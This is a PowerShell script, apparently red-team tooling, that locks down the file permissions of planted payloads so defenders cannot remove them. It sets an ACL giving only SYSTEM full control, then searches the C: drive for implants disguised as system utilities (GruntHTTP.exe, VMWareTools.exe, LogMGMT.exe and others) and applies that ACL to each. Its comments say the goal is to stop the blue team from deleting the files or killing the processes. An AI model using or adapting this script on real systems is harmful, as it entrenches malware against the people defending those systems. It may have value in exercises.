Function Set-FilePermissions {
	Param(
	$user,
	$folder)
}

$ACL = New-Object System.Security.AccessControl.DirectorySecurity #variable = new object 
$ACL.SetAccessRuleProtection($true,$true) #disables inheritance. true true means off and off

$rule1 = new-object System.Security.AccessControl.FileSystemAccessRule("SYSTEM", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")

#include current user as having full access as well as the system to have full access
$ACL.SetAccessRule($rule1)
$acl

#Run this command not in ISE. This command sets permissions for specific rules using our script
# Set the ACL for all payloads to prevent blue team from being able to delete and kill the processes
$ACL | Set-Acl -Path C:\Users\GruntHTTP.exe

# Find all payloads and store in variables 
$file = 'malware.xml'
$searchinfolder = 'C:\'
$malware = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $malware

$file = 'iexplorerr.exe'
$searchinfolder = 'C:\'
$explorer = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $explorer

$file = 'PowerHell.bat'
$searchinfolder = 'C:\'
$hell = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path hell

$file = 'PowerManagement.exe'
$searchinfolder = 'C:\'
$power = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $power

$file = 'VMWareTools.exe'
$searchinfolder = 'C:\'
$vmware = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $vmware

$file = 'DiskHelper.exe'
$searchinfolder = 'C:\'
$disk = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $disk

$file = 'audio.exe'
$searchinfolder = 'C:\'
$audio = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $audio

$file = 'LogMGMT.exe'
$searchinfolder = 'C:\'
$logmgmt = Get-ChildItem -path $searchinfolder -filter $file -Recurse | %{$_.FullName}
$ACL | Set-Acl -Path $logmgmt
